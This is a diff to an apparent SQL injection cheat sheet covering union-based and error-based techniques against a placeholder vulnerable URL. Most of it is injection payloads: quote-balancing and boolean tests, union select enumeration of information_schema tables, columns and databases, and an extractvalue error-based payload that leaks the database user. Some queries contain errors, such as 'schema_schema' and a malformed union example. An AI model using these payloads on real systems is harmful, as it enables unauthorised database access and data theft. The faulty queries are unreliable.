@@ -1,25 +1,47 @@
-Sql query
+<h1>SQL Injection</h1>
+
+Union based SQL Injection
+=========================
  
-1. Balancing query
-2. Checking true false condition by and 1=1 or 1=2
-3. Finding columns
-4. Invalidating output of first query.
-5. Using union select 1,2 — -                                                ——>Union select 1,table_name,3 from information_schema.tables where table_schema=‘mysql’ table_name=‘user’
-->For finding table name:-  
+Let's assume, vulnerable URL is:
 
-Select table_name from information_schema.tables where table_schema=‘database()’
+     http://b0x.com/vulnerable.php?id=1
+1 . Balance the query
 
-->Column name:-
+     http://b0x.com/vulnerable.php?id=1'-- -
+   
+     http://b0x.com/vulnerable.php?id=1--
+2 . Checking true false condition by using below mentioned payloads 
 
-For finding column name:-(specify table_name of table)
+     http://b0x.com/vulnerable.php?id=1' and 1=1-- -
+     http://b0x.com/vulnerable.php?id=1' and 1=2-- -
+     
+     http://b0x.com/vulnerable.php?id=1' and 1='1
+     http://b0x.com/vulnerable.php?id=1' and 1='2     
+4. Finding columns
+5. Invalidating output of first query.
+6. Using union select 1,2 — -  ——>Union select 1,table_name,3 from information_schema.tables where table_schema=‘mysql’ table_name=‘user’
 
-Select column_name from information_schema.columns where table_schema=‘security, mysql,dvwa or database()’ and table_name=‘user’
+<b>Find the table name</b> 
 
-->For finding database list:-
+    Select table_name from information_schema.tables where table_schema=database()
 
-Select group_concat(table_schema) from information__schema.tables
 
-=====Sql query for error base=====
+<b>extract column names</b>
+
+To find column name from specify table and database
+
+    Select column_name from information_schema.columns where table_schema='security' and table_name='user'
+To find column name from specify table of current database
+
+    Select column_name from information_schema.columns where table_schema=database() and table_name='user'
+
+<b>Finding the list of databases</b>
+
+Select group_concat(schema_schema) from information_schema.schemata
+
+Error based SQL Injection
+=========================
 
 ->and extractvalue(1,concat(0x7e,user()))
 
